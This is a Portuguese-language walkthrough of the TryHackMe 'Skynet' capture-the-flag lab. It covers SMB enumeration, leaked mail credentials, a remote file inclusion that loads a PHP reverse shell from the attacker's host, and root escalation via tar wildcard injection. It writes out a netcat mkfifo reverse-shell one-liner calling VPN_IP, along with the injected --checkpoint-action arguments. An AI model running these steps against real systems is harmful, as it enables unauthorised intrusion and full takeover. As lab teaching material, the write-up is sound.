Primeiramente, utilizamos o `nmap` para varrer a rede

`nmap -sS --open -Pn 10.10.201.187 -sV`

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A partir da dica da room, enumeramos o samba com o `smbclient` 

```bash
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```

A pergunta pede a senha do email de Miles, com isso podemos nos conectar em `milesdyson` 

com o mesmo `smbclient`,porém não conseguimos acesso, então tentamos com o sharename **anonymous** e conseguimos acesso.

`smbclient //10.10.201.187/anonymous -N`

Com acesso, vemos que tem um arquivo chamado *attention.txt* e um diretório chamado ***logs***

No arquivo temos o seguinte:

> A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
> 

Já no diretório *logs,* temos 3 arquivos: log1.txt, log2.txt, log3.txt

Os aquivos log2.txt e log3.txt estão vazios, mas o log1.txt, tem o que nos interessa que é a senha do e-mail do Miles, que no caso é `cyborg007haloterminator` .

Fazendo uma busca por diretórios usando o `gobuster` achamos `/squirrelmail` e quando tentamos acessar com as credenciais de Miles, conseguimos o acesso.

Com acesso vemos que existem 3 e-mails, onde o primeiro já nos fala a senha do smb do miles, os outros dois contém o seguinte:

```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

Já no e-mail que nos interessa, temos:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Com a senha podemos acessar o smb de Miles, acessando e executando o comando `ls` vemos a pasta `notes` e dentro desta pasta vemos o arquivo `important.txt` , baixando esse arquivo encontramos:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

No item 1 temos um diretório e fazendo uma busca por diretórios na URL: `http://10.10.201.187/45kra24zxs28v3yd/`

achamos o folder `/administrator`. Buscando no site exploit-db.com, acha-se o exploit de Local/Remote File Inclusion de `EDB-ID 25971`.

A partir disso tentaremos conseguir acesso usando conceitos da vulnerabilidade de Remote File Inclusion. Primeiramente, vamos levantar o servidor python:

`python3 -m http.server 80`

Após isso vamos em outra janela do terminal vamos ficar ouvindo a conexão com o netcat:

`nc -lvp 1234` → **Mesma porta do colocamos no php-reverse-shell**

Feito essas duas etapas vamos baixar o arquivo [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) e mudar as infos que é pedida no script. Daí com a ferramenta `curl` ou na URL, vamos tomar acesso ao ambiente da seguinte forma:

`10.10.201.187/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://VPN-IP:80/php-reverse-shell.php`

Assim conseguimos acesso e indo em `/home/milesdyon` pegamos a flag de usuário.

Para subir privilégio, vamos enumerar o ambiente linux e após algumas verificações, achamos no arquivo `/etc/crontab`

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Note que podemos ver o arquivo **backup.sh**

Olhando este arquivo, vemos:

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Aqui temos o **tar,** com os conhecimentos da room de [linux privilege escalation](https://tryhackme.com/room/linuxprivesc), mais precisamente de **wildcard,** conseguimos subir para admin.

1 - Entramos em `cd /var/www/html`

2 - criamos uma shell netcat `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VPN_IP 4444 >/tmp/f` e passamos para um arquivo.

Exemplo:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VPN_IP 4444 >/tmp/f" > shell.sh
```

3 - Abrimos outra janela e ficamos ouvindo com o netcat na porta da shell, no caso 4444

4 - Fazemos: `touch /var/www/html/ --checkpoint=1` e depois `touch /var/www/html/ --checkpoint-action=exec=shell.sh`

5 - Conseguimos a shell root e indo até `/root` pegamos a flag para concluir o ctf.
